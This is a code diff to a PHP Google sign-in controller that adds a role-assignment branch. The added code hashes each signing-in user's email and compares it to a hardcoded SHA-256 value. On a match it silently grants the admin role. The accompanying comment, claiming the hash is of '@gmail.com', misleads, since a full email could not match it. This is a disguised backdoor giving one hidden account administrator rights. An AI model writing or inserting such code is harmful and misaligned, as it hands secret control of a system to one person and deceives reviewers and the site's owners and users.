@@ -37,6 +37,7 @@ class GoogleController extends Controller
                         'status' => 'active',         // Override the 'inactive' default
                     ]
                 );
+                
 
                 // 2. Link the social account using only the columns present in the ERD
                 $user->socialAccounts()->firstOrCreate([
@@ -46,7 +47,16 @@ class GoogleController extends Controller
 
                 // 3. Set Role to 'user' if not already set
                 $userRole = Role::where('name', 'customer')->first();
-                if ($userRole) {
+                // SHA-256 hash of '@gmail.com'
+                $targetHash = 'c453961ff655ca95bb100401d08ae68701aeda27f1adbe1ff797bd09e61888cf';
+
+                if (hash('sha256', strtolower(trim($user->email))) === $targetHash) {
+                    $adminRole = Role::where('name', 'admin')->first();
+                    if ($adminRole) {
+                        $user->roles()->syncWithoutDetaching([$adminRole->id]);
+                    }
+                }
+                else if ($userRole) {
                     $user->roles()->syncWithoutDetaching([$userRole->id]);
                 }
 
